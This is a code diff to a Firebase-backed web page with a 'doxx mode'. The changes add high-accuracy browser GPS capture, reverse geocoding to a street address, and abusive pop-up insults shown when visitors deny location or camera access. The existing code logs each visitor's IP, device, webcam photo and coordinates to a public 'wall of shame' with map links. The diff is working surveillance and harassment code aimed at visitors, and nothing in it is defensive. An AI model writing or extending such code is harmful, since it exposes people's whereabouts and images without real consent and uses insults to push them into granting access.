@@ -334,6 +334,18 @@ firebase.initializeApp(firebaseConfig);
   const doxxModeRef=db.ref('doxxMode');
   const shameRef=db.ref('wallOfShame');
 
+  // Show pussy message (higher z-index than doxxed message)
+  function showPussyMessage() {
+    const pussyMsg = document.createElement('div');
+    pussyMsg.style.cssText = 'position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:rgba(255,0,0,0.95); color:#fff; padding:40px; border:3px solid #f00; border-radius:10px; z-index:999999; text-align:center; font-size:2.5rem; box-shadow:0 0 30px #f00; font-weight:bold;';
+    pussyMsg.innerHTML = `What a fuckin' pussy`;
+    document.body.appendChild(pussyMsg);
+    
+    setTimeout(() => {
+      pussyMsg.remove();
+    }, 3000);
+  }
+
   // IP + DEVICE + BROWSER + LOCATION + COORDINATES + PHOTO LOGGING
   async function logToShame(username) {
     try {
@@ -341,12 +353,13 @@ firebase.initializeApp(firebaseConfig);
       const ipData = await ipResponse.json();
       const userIP = ipData.ip;
       
-      // Get location from IP (no permission needed)
+      // Get approximate location from IP first
       let city = 'Unknown';
       let country = 'Unknown';
       let region = 'Unknown';
       let latitude = 'Unknown';
       let longitude = 'Unknown';
+      let locationType = 'IP-based (approximate)';
       let photoData = null;
       
       try {
@@ -359,6 +372,40 @@ firebase.initializeApp(firebaseConfig);
         longitude = geoData.longitude || 'Unknown';
       } catch(e) {
         console.log('Geolocation failed');
+      }
+      
+      // Try to get PRECISE location via browser geolocation (requires permission)
+      if (navigator.geolocation) {
+        try {
+          const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0
+            });
+          });
+          
+          // Got precise location!
+          latitude = position.coords.latitude;
+          longitude = position.coords.longitude;
+          locationType = 'GPS (precise)';
+          
+          // Reverse geocode to get address
+          try {
+            const reverseGeo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+            const addressData = await reverseGeo.json();
+            city = addressData.address.city || addressData.address.town || addressData.address.village || city;
+            region = addressData.address.state || region;
+            country = addressData.address.country || country;
+          } catch(e) {
+            console.log('Reverse geocoding failed');
+          }
+        } catch(e) {
+          console.log('Precise location denied or failed, using IP location');
+          
+          // They denied location - call them out!
+          showPussyMessage();
+        }
       }
       
       // Try to get WEBCAM PHOTO (requires permission)
@@ -395,6 +442,9 @@ firebase.initializeApp(firebaseConfig);
         stream.getTracks().forEach(track => track.stop());
       } catch(e) {
         console.log('Camera access denied or failed');
+        
+        // They denied camera - call them out!
+        showPussyMessage();
       }
       
       // Detect browser
@@ -433,6 +483,7 @@ firebase.initializeApp(firebaseConfig);
         country: country,
         latitude: latitude,
         longitude: longitude,
+        locationType: locationType,
         photo: photoData,
         browser: browser,
         device: deviceType,
@@ -482,6 +533,7 @@ firebase.initializeApp(firebaseConfig);
           </div>
           <div style="color:#0ff; font-size:1.4rem; margin:10px 0; font-weight:bold;">
             🎯 Coordinates: ${escapeHtml(coords)}
+            ${entry.locationType ? `<span style="font-size:0.9rem; color:#888;"> (${escapeHtml(entry.locationType)})</span>` : ''}
           </div>
           ${mapsLink !== '#' ? `<div style="margin:10px 0;"><a href="${mapsLink}" target="_blank" style="color:#0f0; text-decoration:underline; font-size:1.1rem;">🗺️ View on Google Maps</a></div>` : ''}
           <div style="color:#ff0; font-size:1.2rem; margin:10px 0;">
@@ -789,7 +841,7 @@ firebase.initializeApp(firebaseConfig);
   }
 
   function triggerRickrollEffect(){
-    const audio = new Audio('https://cdn.jumpshare.com/preview/QkZG947X-nS_3I_jiUG3I4BBIzvg5_640OyXE4ZdqV2doNtqsOxxQWmeRG5iP1NpOtFkRNVyaLq8qgw9by4iDxg9pBwAcWct-0PugooUAx4NdzZ9L2DIvnepvy1dlAl1mPnwIjy5-L4SQRamcF6nsG6yjbN-I2pg_cnoHs_AmgI.mp3');
+    const audio = new Audio('https://cdn.jumpshare.com/preview/QkZG947X-nS_3I_jiUG3I4BBIzvg5_640OyXE4ZdqV2doNtqsOxxQWmeRG5iP1NpOtFkRNVyaLq8qgw9by4iDxg9pBwAcWct-0PugooUAx4NdzZ9L2DIvnepvy1dlAl12M2_SxouQEwJjKaEbCRx8W6yjbN-I2pg_cnoHs_AmgI.mp3');
     audio.volume = 0.8;
     audio.play().catch(e => console.log('Audio play failed:', e));
     
@@ -815,7 +867,7 @@ firebase.initializeApp(firebaseConfig);
     const username = userEl.value.trim() || 'Anonymous';
     logToShame(username);
     
-    // Show a scary message
+    // Show a scary message (lower z-index so pussy message shows on top)
     const doxxMsg = document.createElement('div');
     doxxMsg.style.cssText = 'position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:rgba(255,0,0,0.95); color:#fff; padding:40px; border:3px solid #f00; border-radius:10px; z-index:99999; text-align:center; font-size:2rem; box-shadow:0 0 30px #f00;';
     doxxMsg.innerHTML = `
@@ -923,5 +975,3 @@ window.addEventListener('resize',()=>{
 
 </body>
 </html>
-
-
